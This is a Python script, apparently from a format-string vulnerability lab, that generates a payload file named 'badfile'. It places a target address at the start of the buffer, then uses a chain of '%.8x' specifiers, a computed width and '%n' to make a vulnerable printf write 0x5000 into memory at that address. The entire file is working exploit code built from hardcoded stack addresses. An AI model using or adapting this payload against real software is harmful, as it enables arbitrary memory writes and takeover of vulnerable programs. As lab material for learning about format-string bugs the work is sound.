#! /usr/bin/python3

EBP = 0xffffd248
INP = 0xffffd320

def main():
    # Initialize the content array
    N = 1500
    content = bytearray(0x0 for i in range(N))
    target_value = 0x5000
    target_addr = 0x080e5068
    content[0:4]  =  (target_addr).to_bytes(4,byteorder='little')
    distance = abs(EBP - INP) // 4
    print("The difference between the addresses of the frame pointer and the address of the input buffer (in bytes) is", distance)
    # the offset take into consideration the 4 bytes of the target address, the %.{C}x, and the %n values inserted, so 11 - 3 = 8
    offset = 8
    distance = distance + offset
    print("The number of %x is", distance)
    # printed contains the byte size of: the first 4 bytes of target address
    # + the 8 bytes of all the addresses that read from memory (which quantity
    # is equal distance)
    printed = 4 + 8*distance
    # count contains the reamaining byte size that we need so %n will write
    # the target_value (that corresponds to number of characters printed out
    # so far) into memory
    count = target_value - printed
    pattern = '{Prefix}%.{C}x%n\n'
    s = pattern.format(Prefix = "%.8x"*distance, C=count)
    # print(s)
    fmt  = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt

    # Write the content to badfile
    with open('badfile', 'wb') as f:
        f.write(content)

if __name__ == "__main__":
  main()